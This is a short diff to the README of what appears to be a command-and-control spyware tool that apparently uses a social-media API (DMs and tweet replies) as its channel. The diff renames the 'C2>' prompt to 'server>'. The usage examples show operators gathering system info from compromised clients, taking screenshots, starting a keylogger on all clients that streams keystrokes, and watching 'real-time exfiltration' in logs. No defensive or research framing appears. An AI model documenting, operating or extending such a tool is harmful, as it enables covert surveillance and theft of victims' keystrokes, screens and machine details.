@@ -23,13 +23,13 @@ With this new API, you need to have a basic plan to be able to use this project 
   - python client.py
 
 ## Shell-Like Interaction examples
-- C2> `sysinfo`
+- server> `sysinfo`
   - Logs show responses like: Response from <client_id>: {'o': 'Windows', 'h': 'HOST1', 'i': '192.168.1.10'}
   - Target a specific client (replace <client_id> with actual ID from logs):
-- C2> `target:<client_id> screenshot`
+- server> `target:<client_id> screenshot`
   - Logs show chunked screenshot data.
 - Start keylogger on all clients:
-  - C2> `keylogger_start`
+  - server> `keylogger_start`
   - Logs show keystrokes every 10 keys (e.g., Response from <client_id>: "hello[SPACE]world").
 - View Responses:
   - Check server logs for real-time exfiltration from DMs or tweet replies.
